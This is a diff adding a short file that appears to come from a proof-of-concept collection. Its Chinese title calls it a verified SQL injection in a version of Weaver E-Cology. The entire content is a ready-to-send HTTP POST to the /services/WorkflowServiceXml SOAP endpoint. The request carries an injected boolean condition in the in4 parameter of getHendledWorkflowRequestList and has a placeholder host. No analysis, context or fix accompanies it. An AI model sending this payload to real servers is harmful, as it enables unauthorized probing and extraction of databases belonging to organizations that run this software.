@@ -1,0 +1,8 @@
+泛微E-Cology 某版本SQL注入漏洞（已验证）
+
+POST /services/WorkflowServiceXml HTTP/1.1
+Host: ip:port
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+Content-Type: text/xml
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver"> <soapenv:Header/> <soapenv:Body> <web:getHendledWorkflowRequestList> <web:in0>1</web:in0> <web:in1>1</web:in1> <web:in2>1</web:in2> <web:in3>1</web:in3> <web:in4> <web:string>1=1 AND 2=2</web:string> </web:in4> </web:getHendledWorkflowRequestList> </soapenv:Body> </soapenv:Envelope>
